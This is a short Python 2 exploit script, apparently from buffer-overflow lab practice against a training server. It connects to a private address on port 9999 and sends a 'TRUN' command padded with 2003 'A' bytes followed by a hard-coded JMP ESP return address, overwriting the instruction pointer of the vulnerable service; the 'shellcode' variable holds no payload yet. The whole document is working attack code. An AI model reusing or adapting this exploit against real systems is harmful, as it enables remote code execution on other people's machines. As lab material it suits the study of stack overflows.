#!/usr/bin/python
import sys, socket

#value of jmp esp = 625011af
shellcode = "A"*2003 + "\xaf\x11\x50\x62"

try:
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.connect(('192.168.8.162' , 9999))

		s.send(("TRUN /.:/" + shellcode))
		s.close()

except:
		#Connection error
		print "Error connecting to server"
		sys.exit()


